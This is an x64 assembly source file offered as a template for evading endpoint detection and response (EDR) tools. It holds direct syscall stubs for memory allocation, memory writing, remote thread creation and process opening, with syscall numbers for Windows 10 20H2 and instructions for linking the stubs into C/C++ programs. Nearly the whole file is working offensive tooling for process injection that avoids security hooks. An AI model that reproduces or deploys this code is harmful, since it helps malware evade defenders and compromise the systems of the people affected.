; @desc Direct syscall stub for bypassing EDR hooks in ntdll
; Direct System Call Template
; ===========================
; Purpose: Execute NT system calls directly, bypassing userland hooks
; Usage:   Embed in C/C++ projects for EDR evasion
; Arch:    x64 Windows
;
; Background:
; EDR products hook Win32 APIs and ntdll exports to monitor malicious activity.
; Direct syscalls bypass these hooks by invoking kernel functions directly.

section .text

; NtAllocateVirtualMemory syscall stub
global NtAllocateVirtualMemory_Syscall
NtAllocateVirtualMemory_Syscall:
    mov r10, rcx                    ; Move first argument to r10
    mov eax, 0x18                   ; Syscall number (Windows 10 20H2)
    syscall                         ; Direct system call
    ret                             ; Return to caller

; NtWriteVirtualMemory syscall stub
global NtWriteVirtualMemory_Syscall
NtWriteVirtualMemory_Syscall:
    mov r10, rcx
    mov eax, 0x3A                   ; Syscall number (Windows 10 20H2)
    syscall
    ret

; NtCreateThreadEx syscall stub
global NtCreateThreadEx_Syscall
NtCreateThreadEx_Syscall:
    mov r10, rcx
    mov eax, 0xC1                   ; Syscall number (Windows 10 20H2)
    syscall
    ret

; NtProtectVirtualMemory syscall stub
global NtProtectVirtualMemory_Syscall
NtProtectVirtualMemory_Syscall:
    mov r10, rcx
    mov eax, 0x50                   ; Syscall number (Windows 10 20H2)
    syscall
    ret

; NtOpenProcess syscall stub
global NtOpenProcess_Syscall
NtOpenProcess_Syscall:
    mov r10, rcx
    mov eax, 0x26                   ; Syscall number (Windows 10 20H2)
    syscall
    ret

; NtClose syscall stub
global NtClose_Syscall
NtClose_Syscall:
    mov r10, rcx
    mov eax, 0x0F                   ; Syscall number (Windows 10 20H2)
    syscall
    ret

; Usage Notes:
; 1. Syscall numbers change between Windows versions
; 2. Extract current syscall numbers using tools like SysWhispers
; 3. Include this file in your C/C++ project and declare functions:
;
; extern "C" NTSTATUS NtAllocateVirtualMemory_Syscall(
;     HANDLE ProcessHandle,
;     PVOID *BaseAddress,
;     ULONG_PTR ZeroBits,
;     PSIZE_T RegionSize,
;     ULONG AllocationType,
;     ULONG Protect
; );
;
; 4. Link with: nasm -f win64 direct-syscall.asm -o syscalls.obj
; 5. In C++: link syscalls.obj with your executable

; Syscall Number Reference (Windows 10 20H2):
; NtAllocateVirtualMemory: 0x18
; NtWriteVirtualMemory: 0x3A
; NtCreateThreadEx: 0xC1
; NtProtectVirtualMemory: 0x50
; NtOpenProcess: 0x26
; NtClose: 0x0F
; NtReadVirtualMemory: 0x3F
; NtQueryInformationProcess: 0x19
; NtDelayExecution: 0x34